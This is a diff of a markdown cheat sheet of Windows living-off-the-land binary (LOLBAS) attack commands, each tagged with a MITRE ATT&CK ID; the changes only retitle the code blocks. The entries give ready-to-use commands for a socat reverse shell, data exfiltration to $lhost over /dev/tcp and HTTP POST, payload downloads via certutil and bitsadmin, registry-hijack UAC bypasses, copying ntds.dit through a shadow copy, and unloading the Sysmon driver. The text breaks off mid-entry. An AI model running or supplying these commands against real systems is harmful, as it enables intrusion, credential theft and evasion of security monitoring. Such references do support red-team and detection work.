@@ -20,7 +20,7 @@ AddinUtil is executed from the directory where the 'Addins.Store' payload exists
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will…"
+```cmd title:"Lolbas AddinUtil.exe Execute"
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
 ```
 <!-- cheat
@@ -39,7 +39,7 @@ AppInstaller.exe is spawned by the default handler for the URI, it attempts to l
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a…"
+```cmd title:"Lolbas AppInstaller.exe Download"
 start ms-appinstaller://?source=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -63,7 +63,7 @@ Execute C# code with the Build Provider and proper folder structure in place.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute C# code with the Build Provider and proper folder structure in place"
+```cmd title:"Lolbas Execute C# code with the Build Provider and proper folder structure in place"
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ Create a recurring task to execute every day at a specific time.
 
 *Privileges: Local Admin • MITRE: T1053.002*
 
-```cmd title:"Create a recurring task to execute every day at a specific time"
+```cmd title:"Lolbas Create a recurring task to execute every day at a specific time"
 C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su $cmd
 ```
 <!-- cheat
@@ -104,7 +104,7 @@ Start a registered Assistive Technology (AT).
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Start a registered Assistive Technology (AT)"
+```cmd title:"Lolbas Start a registered Assistive Technology (AT)"
 ATBroker.exe /start malware
 ```
 <!-- cheat
@@ -124,7 +124,7 @@ Executes executable from bash.exe
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes executable from bash.exe"
+```cmd title:"Lolbas Executes executable from bash.exe"
 bash.exe -c "$cmd"
 ```
 <!-- cheat
@@ -137,7 +137,7 @@ Executes a reverse shell
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes a reverse shell"
+```cmd title:"Lolbas Executes a reverse shell"
 bash.exe -c "socat tcp-connect:$lhost:$lport exec:sh,pty,stderr,setsid,sigint,sane"
 ```
 <!-- cheat
@@ -151,7 +151,7 @@ Exfiltrate data
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Exfiltrate data"
+```cmd title:"Lolbas Exfiltrate data"
 bash.exe -c 'cat $file_out > /dev/tcp/$lhost/24'
 ```
 <!-- cheat
@@ -165,7 +165,7 @@ Executes executable from bash.exe
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes executable from bash.exe"
+```cmd title:"Lolbas Executes executable from bash.exe"
 bash.exe -c "$cmd"
 ```
 <!-- cheat
@@ -178,7 +178,7 @@ When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"When executed, bash.exe queries the registry value of…"
+```cmd title:"Lolbas Bash.exe Execute #5"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation" /ve /d "$file_in" /f
 bash.exe
 ```
@@ -200,7 +200,7 @@ Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command…"
+```cmd title:"Lolbas Bitsadmin.exe ADS #1"
 bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in bitsadmin /SetNotifyCmdLine 1 $file_in NULL bitsadmin /RESUME 1 bitsadmin /complete 1
 ```
 <!-- cheat
@@ -213,7 +213,7 @@ Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target…"
+```cmd title:"Lolbas Bitsadmin.exe Download #2"
 bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe $file_in bitsadmin /RESUME 1 bitsadmin /complete 1
 ```
 <!-- cheat
@@ -226,7 +226,7 @@ Command for copying cmd.exe to another folder
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Command for copying cmd.exe to another folder"
+```cmd title:"Lolbas Command for copying cmd.exe to another folder"
 bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
 ```
 <!-- cheat
@@ -239,7 +239,7 @@ One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configur
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run…"
+```cmd title:"Lolbas Bitsadmin.exe Execute #4"
 bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in & bitsadmin /SetNotifyCmdLine 1 $file_in NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
 ```
 <!-- cheat
@@ -260,7 +260,7 @@ Loads the target DLL file
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Loads the target DLL file"
+```cmd title:"Lolbas Loads the target DLL file"
 certoc.exe -LoadDLL $file_out
 ```
 <!-- cheat
@@ -273,7 +273,7 @@ Downloads text formatted files
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads text formatted files"
+```cmd title:"Lolbas Downloads text formatted files"
 certoc.exe -GetCACAPS $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -297,7 +297,7 @@ Send the specified file (penultimate argument) to the specified URL via HTTP POS
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the…"
+```cmd title:"Lolbas CertReq.exe Download #1"
 CertReq -Post -config $scheme://$lhost:$lport/$file $file_out $file_out
 ```
 <!-- cheat
@@ -314,7 +314,7 @@ Send the specified file (last argument) to the specified URL via HTTP POST and s
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Send the specified file (last argument) to the specified URL via HTTP POST and show response in…"
+```cmd title:"Lolbas CertReq.exe Upload #2"
 CertReq -Post -config $scheme://$lhost:$lport/$file $file_out
 ```
 <!-- cheat
@@ -339,7 +339,7 @@ Download and save an executable to disk in the current folder.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and save an executable to disk in the current folder"
+```cmd title:"Lolbas Download and save an executable to disk in the current folder"
 certutil.exe -urlcache -f $scheme://$lhost:$lport/$file $file_out
 ```
 <!-- cheat
@@ -356,7 +356,7 @@ Download and save an executable to disk in the current folder when a file path i
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and save an executable to disk in the current folder when a file path is specified, or…"
+```cmd title:"Lolbas Certutil.exe Download #2"
 certutil.exe -verifyctl -f $scheme://$lhost:$lport/$file $file_out
 ```
 <!-- cheat
@@ -373,7 +373,7 @@ Download and save a .ps1 file to an Alternate Data Stream (ADS).
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Download and save a .ps1 file to an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Download and save a .ps1 file to an Alternate Data Stream (ADS)"
 certutil.exe -urlcache -f $scheme://$lhost:$lport/$file $file_out:ttt
 ```
 <!-- cheat
@@ -390,7 +390,7 @@ Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and save an executable to %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>"
+```cmd title:"Lolbas Download and save an executable to %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>"
 certutil.exe -URL $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -406,7 +406,7 @@ Command to encode a file using Base64
 
 *Privileges: User • MITRE: T1027.013*
 
-```cmd title:"Command to encode a file using Base64"
+```cmd title:"Lolbas Command to encode a file using Base64"
 certutil -encode $file_out $file_out
 ```
 <!-- cheat
@@ -419,7 +419,7 @@ Command to decode a Base64 encoded file.
 
 *Privileges: User • MITRE: T1140*
 
-```cmd title:"Command to decode a Base64 encoded file"
+```cmd title:"Lolbas Command to decode a Base64 encoded file"
 certutil -decode $file_out $file_out
 ```
 <!-- cheat
@@ -432,7 +432,7 @@ Command to decode a hexadecimal-encoded file.
 
 *Privileges: User • MITRE: T1140*
 
-```cmd title:"Command to decode a hexadecimal-encoded file"
+```cmd title:"Lolbas Command to decode a hexadecimal-encoded file"
 certutil -decodehex $file_out $file_out
 ```
 <!-- cheat
@@ -453,7 +453,7 @@ Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, 
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Once executed, change.exe will execute chgusr.exe in the same folder"
+```cmd title:"Lolbas Once executed, change.exe will execute chgusr.exe in the same folder"
 change.exe user
 ```
 <!-- cheat
@@ -473,7 +473,7 @@ Zero out a file
 
 *Privileges: User • MITRE: T1485*
 
-```cmd title:"Zero out a file"
+```cmd title:"Lolbas Zero out a file"
 cipher /w:$dir
 ```
 <!-- cheat
@@ -486,7 +486,7 @@ Encrypt a file
 
 *Privileges: Admin • MITRE: T1562*
 
-```cmd title:"Encrypt a file"
+```cmd title:"Lolbas Encrypt a file"
 cipher.exe /e $file_out
 ```
 <!-- cheat
@@ -507,7 +507,7 @@ Add content to an Alternate Data Stream (ADS).
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Add content to an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Add content to an Alternate Data Stream (ADS)"
 cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:$scheme://$lhost:$lport/$file ^scrobj.dll > $file_out:payload.bat
 ```
 <!-- cheat
@@ -524,7 +524,7 @@ Execute payload.bat stored in an Alternate Data Stream (ADS).
 
 *Privileges: User • MITRE: T1059.003*
 
-```cmd title:"Execute payload.bat stored in an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Execute payload.bat stored in an Alternate Data Stream (ADS)"
 cmd.exe - < $file_out:payload.bat
 ```
 <!-- cheat
@@ -537,7 +537,7 @@ Downloads a specified file from a WebDAV server to the target file.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads a specified file from a WebDAV server to the target file"
+```cmd title:"Lolbas Downloads a specified file from a WebDAV server to the target file"
 type \\$lhost\$share\$file > $file_out
 ```
 <!-- cheat
@@ -553,7 +553,7 @@ Uploads a specified file to a WebDAV server.
 
 *Privileges: User • MITRE: T1048.003*
 
-```cmd title:"Uploads a specified file to a WebDAV server"
+```cmd title:"Lolbas Uploads a specified file to a WebDAV server"
 type $file_out > \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -577,7 +577,7 @@ List cached credentials
 
 *Privileges: User • MITRE: T1078*
 
-```cmd title:"List cached credentials"
+```cmd title:"Lolbas List cached credentials"
 cmdkey /list
 ```
 <!-- cheat
@@ -597,7 +597,7 @@ Download a file from the web address specified in the configuration file. The do
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download a file from the web address specified in the configuration file"
+```cmd title:"Lolbas Download a file from the web address specified in the configuration file"
 cmdl32 /vpn /lan %cd%\config
 ```
 <!-- cheat
@@ -617,7 +617,7 @@ Silently installs a specially formatted local .INF without creating a desktop ic
 
 *Privileges: User • MITRE: T1218.003*
 
-```cmd title:"Silently installs a specially formatted local .INF without creating a desktop icon"
+```cmd title:"Lolbas Silently installs a specially formatted local .INF without creating a desktop icon"
 cmstp.exe /ni /s $file_out
 ```
 <!-- cheat
@@ -630,7 +630,7 @@ Silently installs a specially formatted remote .INF without creating a desktop i
 
 *Privileges: User • MITRE: T1218.003*
 
-```cmd title:"Silently installs a specially formatted remote .INF without creating a desktop icon"
+```cmd title:"Lolbas Silently installs a specially formatted remote .INF without creating a desktop icon"
 cmstp.exe /ni /s $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -646,7 +646,7 @@ cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cm
 
 *Privileges: Administrator • MITRE: T1218.003*
 
-```cmd title:"cmstp.exe reads the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App…"
+```cmd title:"Lolbas Cmstp.exe Execute #3"
 cmstp.exe /nf
 ```
 <!-- cheat
@@ -666,7 +666,7 @@ Copies the referenced file to C:\Windows\System32\spool\drivers\color\.
 
 *Privileges: User • MITRE: T1036.005*
 
-```cmd title:"Copies the referenced file to C:\Windows\System32\spool\drivers\color\"
+```cmd title:"Lolbas Copies the referenced file to C:\Windows\System32\spool\drivers\color\"
 colorcpl $file_out
 ```
 <!-- cheat
@@ -687,7 +687,7 @@ Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"Upon execution, ComputerDefaults.exe checks two registry values at…"
+```cmd title:"Lolbas ComputerDefaults.exe UAC Bypass"
 ComputerDefaults.exe
 ```
 <!-- cheat
@@ -707,7 +707,7 @@ Upload file, credentials or data exfiltration in general
 
 *Privileges: User • MITRE: T1567*
 
-```cmd title:"Upload file, credentials or data exfiltration in general"
+```cmd title:"Lolbas Upload file, credentials or data exfiltration in general"
 ConfigSecurityPolicy.exe $file_out $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -724,7 +724,7 @@ It will download a remote payload and place it in INetCache.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"It will download a remote payload and place it in INetCache"
+```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
 ConfigSecurityPolicy.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -747,7 +747,7 @@ Execute a command line with conhost.exe as parent process
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute a command line with conhost.exe as parent process"
+```cmd title:"Lolbas Execute a command line with conhost.exe as parent process"
 conhost.exe $cmd
 ```
 <!-- cheat
@@ -760,7 +760,7 @@ Execute a command line with conhost.exe as parent process
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute a command line with conhost.exe as parent process"
+```cmd title:"Lolbas Execute a command line with conhost.exe as parent process"
 conhost.exe --headless $cmd
 ```
 <!-- cheat
@@ -781,7 +781,7 @@ Execute evil.dll which is stored in an Alternate Data Stream (ADS).
 
 *Privileges: User • MITRE: T1218.002*
 
-```cmd title:"Execute evil.dll which is stored in an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Execute evil.dll which is stored in an Alternate Data Stream (ADS)"
 control.exe $file_out:evil.dll
 ```
 <!-- cheat
@@ -790,11 +790,11 @@ var file_out
 
 ### Control.exe Execute #2
 
-Execute .cpl file. A CPL is a DLL file with CPlApplet export function)
+Execute .cpl file. A CPL is a DLL file with CPlApplet export function.
 
 *Privileges: User • MITRE: T1218.002*
 
-```cmd title:"Execute .cpl file. A CPL is a DLL file with CPlApplet export function)"
+```cmd title:"Lolbas Execute .cpl file. A CPL is a DLL file with CPlApplet export function."
 control.exe $file_out
 ```
 <!-- cheat
@@ -819,7 +819,7 @@ Use csc.exe to compile C# code, targeting the .NET Framework, stored in the spec
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and…"
+```cmd title:"Lolbas Csc.exe Compile #1"
 csc.exe -out:$file_out $file_out
 ```
 <!-- cheat
@@ -832,7 +832,7 @@ Use csc.exe to compile C# code, targeting the .NET Framework, stored in the spec
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and…"
+```cmd title:"Lolbas Csc.exe Compile #2"
 csc -target:library $file_out
 ```
 <!-- cheat
@@ -853,7 +853,7 @@ Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data St
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)"
 cscript //e:vbscript $file_out:script.vbs
 ```
 <!-- cheat
@@ -873,7 +873,7 @@ Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if 
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the…"
+```cmd title:"Lolbas CustomShellHost.exe Execute"
 CustomShellHost.exe
 ```
 <!-- cheat
@@ -892,7 +892,7 @@ Upload file, credentials or data exfiltration in general
 
 *Privileges: User • MITRE: T1567*
 
-```cmd title:"Upload file, credentials or data exfiltration in general"
+```cmd title:"Lolbas Upload file, credentials or data exfiltration in general"
 DataSvcUtil /out:$file_out /uri:$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -916,7 +916,7 @@ Downloads the file and sets it as the computer's lockscreen
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads the file and sets it as the computer's lockscreen"
+```cmd title:"Lolbas Downloads the file and sets it as the computer's lockscreen"
 set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:$scheme://$lhost:$lport/$file /eventName:desktopimgdownldr
 ```
 <!-- cheat
@@ -939,7 +939,7 @@ Grab the console window handle and set it to hidden
 
 *Privileges: User • MITRE: T1564*
 
-```cmd title:"Grab the console window handle and set it to hidden"
+```cmd title:"Lolbas Grab the console window handle and set it to hidden"
 DeviceCredentialDeployment
 ```
 <!-- cheat
@@ -961,7 +961,7 @@ Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet Click
 
 *Privileges: User • MITRE: T1127.002*
 
-```cmd title:"Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
+```cmd title:"Lolbas Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
 rundll32.exe dfshim.dll,ShOpenVerbApplication $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -985,7 +985,7 @@ Compress a file (first argument) into a CAB file stored in the Alternate Data St
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the…"
+```cmd title:"Lolbas Diantz.exe ADS #1"
 diantz.exe $file_out $file_out:targetFile.cab
 ```
 <!-- cheat
@@ -998,7 +998,7 @@ Download and compress a remote file and store it in a CAB file on local machine.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and compress a remote file and store it in a CAB file on local machine"
+```cmd title:"Lolbas Download and compress a remote file and store it in a CAB file on local machine"
 diantz.exe \\$lhost\$share\$file $file_out
 ```
 <!-- cheat
@@ -1014,7 +1014,7 @@ Execute diantz directives as defined in the specified Diamond Definition File (.
 
 *Privileges: User • MITRE: T1036*
 
-```cmd title:"Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources…"
+```cmd title:"Lolbas Diantz.exe Execute #3"
 diantz /f $file_out
 ```
 <!-- cheat
@@ -1035,7 +1035,7 @@ Execute commands using diskshadow.exe from a prepared diskshadow script.
 
 *Privileges: User • MITRE: T1003.003*
 
-```cmd title:"Execute commands using diskshadow.exe from a prepared diskshadow script"
+```cmd title:"Lolbas Execute commands using diskshadow.exe from a prepared diskshadow script"
 diskshadow.exe /s $file_out
 ```
 <!-- cheat
@@ -1048,7 +1048,7 @@ Execute commands using diskshadow.exe to spawn child process
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute commands using diskshadow.exe to spawn child process"
+```cmd title:"Lolbas Execute commands using diskshadow.exe to spawn child process"
 diskshadow> exec $file_out
 ```
 <!-- cheat
@@ -1069,7 +1069,7 @@ Adds a specially crafted DLL as a plug-in of the DNS Service. This command must 
 
 *Privileges: DNS admin • MITRE: T1543.003*
 
-```cmd title:"Adds a specially crafted DLL as a plug-in of the DNS Service"
+```cmd title:"Lolbas Adds a specially crafted DLL as a plug-in of the DNS Service"
 dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -1092,7 +1092,7 @@ Copies the source VBS file to the destination VBS file.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copies the source VBS file to the destination VBS file"
+```cmd title:"Lolbas Copies the source VBS file to the destination VBS file"
 esentutl.exe /y $file_out /d $file_out /o
 ```
 <!-- cheat
@@ -1105,7 +1105,7 @@ Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copies the source EXE to an Alternate Data Stream (ADS) of the destination file"
+```cmd title:"Lolbas Copies the source EXE to an Alternate Data Stream (ADS) of the destination file"
 esentutl.exe /y $file_out /d $file_out:file.exe /o
 ```
 <!-- cheat
@@ -1118,7 +1118,7 @@ Copies the source Alternate Data Stream (ADS) to the destination EXE.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copies the source Alternate Data Stream (ADS) to the destination EXE"
+```cmd title:"Lolbas Copies the source Alternate Data Stream (ADS) to the destination EXE"
 esentutl.exe /y $file_out:file.exe /d $file_out /o
 ```
 <!-- cheat
@@ -1131,7 +1131,7 @@ Copies the remote source EXE to the destination Alternate Data Stream (ADS) of t
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file"
+```cmd title:"Lolbas Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file"
 esentutl.exe /y \\$lhost\$share\$file /d $file_out:file.exe /o
 ```
 <!-- cheat
@@ -1147,7 +1147,7 @@ Copies the source EXE to the destination EXE file
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copies the source EXE to the destination EXE file"
+```cmd title:"Lolbas Copies the source EXE to the destination EXE file"
 esentutl.exe /y \\$lhost\$share\$file /d \\$lhost\$share\$file /o
 ```
 <!-- cheat
@@ -1162,7 +1162,7 @@ Copies a (locked) file using Volume Shadow Copy
 
 *Privileges: Admin • MITRE: T1003.003*
 
-```cmd title:"Copies a (locked) file using Volume Shadow Copy"
+```cmd title:"Lolbas Copies a (locked) file using Volume Shadow Copy"
 esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d $file_out
 ```
 <!-- cheat
@@ -1183,7 +1183,7 @@ Once executed, the Private Charecter Editor will be opened - click OK, then clic
 
 *Privileges: Administrator • MITRE: T1548.002*
 
-```cmd title:"Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font…"
+```cmd title:"Lolbas Eudcedit.exe UAC Bypass"
 eudcedit
 ```
 <!-- cheat
@@ -1203,7 +1203,7 @@ During startup, eventvwr.exe checks the registry value `HKCU\Software\Classes\ms
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"During startup, eventvwr.exe checks the registry value…"
+```cmd title:"Lolbas Eventvwr.exe UAC Bypass #1"
 reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "$file_in" /f
 eventvwr.exe
 ```
@@ -1217,7 +1217,7 @@ During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\Micr
 
 *Privileges: Administrator • MITRE: T1548.002*
 
-```cmd title:"During startup, eventvwr.exe uses .NET deserialization with…"
+```cmd title:"Lolbas Eventvwr.exe UAC Bypass #2"
 ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "$cmd" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
 ```
 <!-- cheat
@@ -1238,7 +1238,7 @@ Copies source file to destination.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copies source file to destination"
+```cmd title:"Lolbas Copies source file to destination"
 expand \\$lhost\$share\$file $file_out
 ```
 <!-- cheat
@@ -1254,7 +1254,7 @@ Copies source file to destination.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copies source file to destination"
+```cmd title:"Lolbas Copies source file to destination"
 expand $file_out $file_out
 ```
 <!-- cheat
@@ -1267,7 +1267,7 @@ Copies source file to destination Alternate Data Stream (ADS)
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copies source file to destination Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Copies source file to destination Alternate Data Stream (ADS)"
 expand \\$lhost\$share\$file $file_out:file.bat
 ```
 <!-- cheat
@@ -1291,7 +1291,7 @@ Execute specified .exe with the parent process spawning from a new instance of e
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute specified .exe with the parent process spawning from a new instance of explorer.exe"
+```cmd title:"Lolbas Execute specified .exe with the parent process spawning from a new instance of explorer.exe"
 explorer.exe /root,"$file_out"
 ```
 <!-- cheat
@@ -1304,7 +1304,7 @@ Execute notepad.exe with the parent process spawning from a new instance of expl
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute notepad.exe with the parent process spawning from a new instance of explorer.exe"
+```cmd title:"Lolbas Execute notepad.exe with the parent process spawning from a new instance of explorer.exe"
 explorer.exe $file_out
 ```
 <!-- cheat
@@ -1325,7 +1325,7 @@ Load a DLL located in the specified folder with one of the following names mozcr
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Load a DLL located in the specified folder with one of the following names mozcrt19.dll,…"
+```cmd title:"Lolbas Extexport.exe Execute"
 Extexport.exe $dir foo bar
 ```
 <!-- cheat
@@ -1346,7 +1346,7 @@ Extracts the source CAB file into an Alternate Data Stream (ADS) of the target f
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file"
+```cmd title:"Lolbas Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file"
 extrac32 $file_out $file_out:file.exe
 ```
 <!-- cheat
@@ -1359,7 +1359,7 @@ Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) 
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file"
+```cmd title:"Lolbas Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file"
 extrac32 $file_out $file_out:file.exe
 ```
 <!-- cheat
@@ -1372,7 +1372,7 @@ Copy the source file to the destination file and overwrite it.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy the source file to the destination file and overwrite it"
+```cmd title:"Lolbas Copy the source file to the destination file and overwrite it"
 extrac32 /Y /C \\$lhost\$share\$file $file_out
 ```
 <!-- cheat
@@ -1388,7 +1388,7 @@ Command for copying file from one folder to another
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Command for copying file from one folder to another"
+```cmd title:"Lolbas Command for copying file from one folder to another"
 extrac32.exe /C $file_out $file_out
 ```
 <!-- cheat
@@ -1409,7 +1409,7 @@ Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specif
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is…"
+```cmd title:"Lolbas Findstr.exe ADS #1"
 findstr /V /L W3AllLov3LolBas $file_out > $file_out:file.exe
 ```
 <!-- cheat
@@ -1422,7 +1422,7 @@ Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe i
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an…"
+```cmd title:"Lolbas Findstr.exe ADS #2"
 findstr /V /L W3AllLov3LolBas \\$lhost\$share\$file > $file_out:file.exe
 ```
 <!-- cheat
@@ -1438,7 +1438,7 @@ Search for stored password in Group Policy files stored on SYSVOL.
 
 *Privileges: User • MITRE: T1552.001*
 
-```cmd title:"Search for stored password in Group Policy files stored on SYSVOL"
+```cmd title:"Lolbas Search for stored password in Group Policy files stored on SYSVOL"
 findstr /S /I cpassword \\sysvol\policies\*.xml
 ```
 <!-- cheat
@@ -1450,7 +1450,7 @@ Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe i
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the…"
+```cmd title:"Lolbas Findstr.exe Download #4"
 findstr /V /L W3AllLov3LolBas \\$lhost\$share\$file > $file_out
 ```
 <!-- cheat
@@ -1474,7 +1474,7 @@ Downloads payload from remote Finger server. This example connects to "example.h
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote Finger server"
+```cmd title:"Lolbas Downloads payload from remote Finger server"
 finger user@example.host.com | more +2 | cmd
 ```
 <!-- cheat
@@ -1493,7 +1493,7 @@ Unloads a driver used by security agents
 
 *Privileges: Admin • MITRE: T1562.001*
 
-```cmd title:"Unloads a driver used by security agents"
+```cmd title:"Lolbas Unloads a driver used by security agents"
 fltMC.exe unload SysmonDrv
 ```
 <!-- cheat
@@ -1513,7 +1513,7 @@ Executes specified command since there is a match for notepad.exe in the c:\wind
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder"
+```cmd title:"Lolbas Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder"
 forfiles /p c:\windows\system32 /m notepad.exe /c "$cmd"
 ```
 <!-- cheat
@@ -1526,7 +1526,7 @@ Executes the evil.exe Alternate Data Stream (AD) since there is a match for note
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the…"
+```cmd title:"Lolbas Forfiles.exe ADS #2"
